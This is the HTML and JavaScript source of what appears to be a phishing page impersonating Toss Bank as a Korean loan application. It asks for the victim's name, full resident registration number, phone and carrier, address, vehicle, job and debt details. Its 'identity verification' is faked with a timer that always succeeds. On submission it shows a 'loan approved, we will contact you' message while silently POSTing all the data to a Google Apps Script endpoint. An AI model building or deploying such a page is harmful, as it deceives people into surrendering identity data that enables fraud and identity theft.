<!DOCTYPE html>
<html lang="ko">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>toss bank</title>


<style>

*{
box-sizing:border-box;
}


body{
margin:0;
background:#f5f6f8;
font-family:"Noto Sans KR",Arial,sans-serif;
}


.container{

max-width:430px;
margin:20px auto;
padding:15px;

}


.card{

background:#fff;
border-radius:20px;
padding:25px;
box-shadow:0 5px 20px rgba(0,0,0,.08);

}


.logo{

display:flex;
align-items:center;
justify-content:center;
gap:15px;
margin-bottom:20px;

}

.logo img{

width:60px;
height:60px;
object-fit:contain;

}

.logo-text{

text-align:left;

}

.logo-text h1{

margin:0;
font-size:28px;
font-weight:700;
color:#0064ff;

}

.logo-text p{

margin:5px 0 0;
font-size:14px;
color:#666;

}


.step{

display:none;

}


.step.active{

display:block;

}


h2{

font-size:22px;
margin-bottom:20px;

}



label{

display:block;
margin-top:15px;
font-weight:bold;

}



input,
select{

width:100%;
height:48px;
margin-top:7px;
border:1px solid #ddd;
border-radius:10px;
padding:0 12px;
font-size:15px;

}



button{

width:100%;
height:50px;
margin-top:25px;
border:0;
border-radius:12px;
background:#0064ff;
color:white;
font-size:16px;
font-weight:bold;

}



.jumin{

display:flex;
align-items:center;
gap:10px;

}



.jumin input{

text-align:center;

}



.loading{

display:none;
text-align:center;
padding:40px 0;
font-size:18px;

}


.agree{
display:flex;
align-items:center;
gap:8px;
margin-top:18px;
font-size:14px;
}

.verifyBtn{
width:100%;
margin-top:15px;
height:50px;
background:#0064ff;
color:#fff;
border:none;
border-radius:12px;
font-size:16px;
font-weight:bold;
cursor:pointer;
}

#verifyResult{
margin-top:12px;
text-align:center;
font-size:14px;
font-weight:bold;
}

button:disabled{
background:#cfcfcf;
cursor:not-allowed;
}
</style>

</head>


<body>



<div class="logo">

    <img src="logo.png.png" alt="">

    <div class="logo-text">

        <h1>toss bank</h1>

        <p>대출 신청</p>

    </div>

</div>





<!-- STEP 1 -->


<div class="step active" id="step1">


<h2>
기본 정보
</h2>




<label>
이름
</label>


<input id="name"
placeholder="이름 입력">





<label>
주민등록번호
</label>



<div class="jumin">


<input id="jumin1"
maxlength="6"
placeholder="생년월일"
oninput="this.value=this.value.replace(/[^0-9]/g,'')">



<span>-</span>


<input id="jumin2"
maxlength="7"
placeholder="뒤 7자리"
oninput="this.value=this.value.replace(/[^0-9]/g,'')">



</div>







<label>
휴대폰 번호
</label>


<input id="phone"
placeholder="010-0000-0000">






<label>
통신사
</label>



<select id="tel">


<option value="">
선택하세요
</option>


<option>
SKT
</option>


<option>
KT
</option>


<option>
LG U+
</option>


<option>
알뜰폰
</option>

<label class="agree">
    <input type="checkbox" id="agree">
    개인정보 수집 및 이용에 동의합니다.
</label>

<button type="button" class="verifyBtn" onclick="verifyUser()">
    본인확인
</button>

<div id="verifyResult"></div>
</select>




<button id="nextBtn" onclick="nextStep1()" disabled>

다음

</button>


</div>





<!-- STEP 2 -->


<div class="step" id="step2">


<h2>
주거 및 차량 정보
</h2>




<label>
주거 형태
</label>


<select id="house" onchange="houseChange()">


<option value="">
선택하세요
</option>


<option>
자가
</option>


<option>
전세
</option>


<option>
월세
</option>


</select>




<div id="houseInfo"></div>





<label>
차량 보유 여부
</label>


<select id="carHave" onchange="carToggle()">



<option value="">
선택하세요
</option>


<option>
보유
</option>


<option>
미보유
</option>


</select>





<div id="carInfo" style="display:none;">



<label>
차량번호
</label>


<input id="carNumber"
placeholder="예) 12가3456">



<label>
제조사
</label>


<select id="brand" onchange="changeModel()">



<option value="">
제조사 선택
</option>


<option>
현대
</option>


<option>
기아
</option>


<option>
제네시스
</option>


<option>
BMW
</option>


<option>
벤츠
</option>


<option>
아우디
</option>


<option>
테슬라
</option>


</select>





<label>
차종
</label>


<input 
id="model"
placeholder="예) 그랜저, 쏘렌토, BMW 5시리즈">





<label>
연식
</label>


<select id="year">

<option>
선택하세요
</option>


</select>



</div>



<button onclick="prevStep1()">
이전
</button>


<button onclick="nextStep2()">
다음
</button>


</div>
<!-- STEP 3 -->


<div class="step" id="step3">


<h2>
직업 정보
</h2>




<label>
직업
</label>



<select id="job" onchange="jobChange()">



<option value="">
선택하세요
</option>



<option>
직장인
</option>



<option>
개인사업자
</option>



<option>
주부
</option>



<option>
학생
</option>



<option>
무직
</option>



</select>





<div id="jobInfo"></div>







<label>
기대출 금액
</label>



<select id="loan">


<option value="">
선택하세요
</option>


<option>
없음
</option>


<option>
1,000만원 이하
</option>


<option>
1,000만원~3,000만원
</option>


<option>
3,000만원~5,000만원
</option>


<option>
5,000만원 이상
</option>


</select>








<label>
필요 자금
</label>



<select id="need">


<option value="">
선택하세요
</option>


<option>
500만원 이하
</option>


<option>
500만원~1,000만원
</option>


<option>
1,000만원~3,000만원
</option>


<option>
3,000만원 이상
</option>


</select>







<label>
개인정보 수집 동의
</label>



<select id="agree">


<option value="">
선택하세요
</option>


<option>
동의합니다
</option>


</select>







<button onclick="prevStep2()">

이전

</button>





<button onclick="submitForm()">

신청하기

</button>




</div>







<!-- 신청 완료 화면 -->


<div class="loading" id="loading">


<h2 id="loadingTitle">
조회중입니다.
</h2>

<p id="loadingText">
입력하신 정보를 확인하고 있습니다.
</p>

<button id="finishBtn"
onclick="goFirst()"
style="display:none;">
확인
</button>

</div>





</div>


</div>
<script>


// STEP1 → STEP2


function nextStep1(){
if(!verified){

    alert("먼저 본인확인을 완료해주세요.");

    return;

}

let name=document.getElementById("name").value;

let jumin1=document.getElementById("jumin1").value;

let jumin2=document.getElementById("jumin2").value;

let phone=document.getElementById("phone").value;

let tel=document.getElementById("tel").value;



if(
name=="" ||
jumin1.length!==6 ||
jumin2.length!==7 ||
phone=="" ||
tel==""

){

alert("필수 정보를 입력해주세요.");

return;

}



document.getElementById("step1").classList.remove("active");

document.getElementById("step2").classList.add("active");


}








// STEP2 → STEP3


function nextStep2(){


let house=document.getElementById("house").value;

let car=document.getElementById("carHave").value;



if(house=="" || car==""){


alert("주거형태와 차량 보유 여부를 선택해주세요.");

return;


}



document.getElementById("step2").classList.remove("active");

document.getElementById("step3").classList.add("active");


}








function prevStep1(){


document.getElementById("step2").classList.remove("active");

document.getElementById("step1").classList.add("active");


}






function prevStep2(){


document.getElementById("step3").classList.remove("active");

document.getElementById("step2").classList.add("active");


}








// 주거 형태


function houseChange(){


let house=document.getElementById("house").value;


let box=document.getElementById("houseInfo");



if(house=="자가"){


box.innerHTML=`

<label>
주소
</label>

<input id="address" placeholder="주소 입력">

`;

}



else if(house=="전세"){


box.innerHTML=`

<label>
전세 보증금
</label>

<input id="deposit">


<label>
주소
</label>

<input id="address">

`;

}




else if(house=="월세"){


box.innerHTML=`

<label>
월세 보증금
</label>

<input id="deposit">


<label>
월세
</label>

<input id="rent">


<label>
주소
</label>

<input id="address">


`;

}



else{


box.innerHTML="";


}



}









// 차량 표시


function carToggle(){


let value=document.getElementById("carHave").value;


let box=document.getElementById("carInfo");



if(value=="보유"){


box.style.display="block";


}else{


box.style.display="none";


}



}









// 차량 데이터












// 연식 생성


window.onload=function(){


let year=document.getElementById("year");



for(
let i=new Date().getFullYear();
i>=2000;
i--
){


let option=document.createElement("option");


option.value=i;


option.text=i+"년";


year.appendChild(option);


}


}









// 직업 선택


function jobChange(){


let job=document.getElementById("job").value;


let box=document.getElementById("jobInfo");




if(job=="직장인"){


box.innerHTML=`

<label>
회사명
</label>

<input>


<label>
입사일
</label>

<input type="date">


<label>
직급
</label>

<input>


<label>
월 소득
</label>

<input>


`;

}




else if(job=="개인사업자"){


box.innerHTML=`

<label>
사업자명
</label>

<input>


<label>
사업자등록번호
</label>

<input>


<label>
업종
</label>

<input>


<label>
개업일
</label>

<input type="date">


<label>
사업장 주소
</label>

<input>


<label>
월 평균 매출
</label>

<input>


<label>
월 순수익
</label>

<input>


`;

}




else if(job=="주부"){


box.innerHTML=`

<label>
배우자 소득 여부
</label>


<select>

<option>
선택하세요
</option>

<option>
유
</option>

<option>
무
</option>


</select>

`;

}




else if(job=="학생"){


box.innerHTML=`

<label>
학교명
</label>


<input>


`;

}




else if(job=="무직"){


box.innerHTML=`

<label>
현재 소득 여부
</label>


<select>

<option>
선택하세요
</option>


<option>
유
</option>


<option>
무
</option>


</select>


`;

}



else{


box.innerHTML="";


}



}









// 신청하기


function submitForm(){


let data = {


name: document.getElementById("name").value,


jumin:
document.getElementById("jumin1").value
+
"-"
+
document.getElementById("jumin2").value,


phone: document.getElementById("phone").value,


tel: document.getElementById("tel").value,


house: document.getElementById("house").value,


address:
document.getElementById("address")
?
document.getElementById("address").value
:
"",



carHave:
document.getElementById("carHave").value,



carNumber:
document.getElementById("carNumber")
?
document.getElementById("carNumber").value
:
"",



brand:
document.getElementById("brand")
?
document.getElementById("brand").value
:
"",



model:
document.getElementById("model")
?
document.getElementById("model").value
:
"",



year:
document.getElementById("year")
?
document.getElementById("year").value
:
"",



job:
document.getElementById("job").value,



loan:
document.getElementById("loan").value,



need:
document.getElementById("need").value



};




// 먼저 조회 화면 표시
document.getElementById("step3").style.display="none";
document.getElementById("loading").style.display="block";
setTimeout(function(){

document.getElementById("loadingTitle").innerHTML =
"✔ 대출 신청이 완료되었습니다.";

document.getElementById("loadingText").innerHTML =
"담당자가 확인 후 연락드리겠습니다.";

document.getElementById("finishBtn").style.display="block";

},1000);
// 그 다음 데이터 전송
fetch(
"https://script.google.com/macros/s/AKfycby7CQavpbVlvC_uhi26x9a8W193Weq8zupMY9QN9GEyxDHs_5KaavZ-Wew6j8H81MZz/exec",
{
    method:"POST",
    mode:"no-cors",
    body:JSON.stringify(data)
}).catch(()=>{
    alert("전송 중 오류가 발생했습니다.");
});
}






let verified = false;

function verifyUser(){

    const name = document.getElementById("name").value.trim();
    const jumin1 = document.getElementById("jumin1").value.trim();
    const jumin2 = document.getElementById("jumin2").value.trim();
    const phone = document.getElementById("phone").value.trim();
    const tel = document.getElementById("tel").value;
    const agree = document.getElementById("agree").checked;

    const result = document.getElementById("verifyResult");

    if(name==""){
        result.innerHTML="이름을 입력한 후 본인확인을 진행해주세요.";
        result.style.color="red";
        return;
    }

    if(jumin1.length!=6 || jumin2.length!=7){
        result.innerHTML="주민등록번호를 정확히 입력한 후 본인확인을 진행해주세요.";
        result.style.color="red";
        return;
    }

    if(phone==""){
        result.innerHTML="휴대폰번호를 입력한 후 본인확인을 진행해주세요.";
        result.style.color="red";
        return;
    }

    if(tel==""){
        result.innerHTML="통신사를 선택한 후 본인확인을 진행해주세요.";
        result.style.color="red";
        return;
    }

    if(!agree){
        result.innerHTML="개인정보 수집 및 이용에 동의해주세요.";
        result.style.color="red";
        return;
    }

    result.innerHTML="본인확인 중입니다...";

    setTimeout(function(){

        verified = true;

        result.innerHTML="✔ 본인확인이 완료되었습니다.";
        result.style.color="#0064ff";

        document.getElementById("nextBtn").disabled=false;

    },500);

}
</script>


</body>

</html>
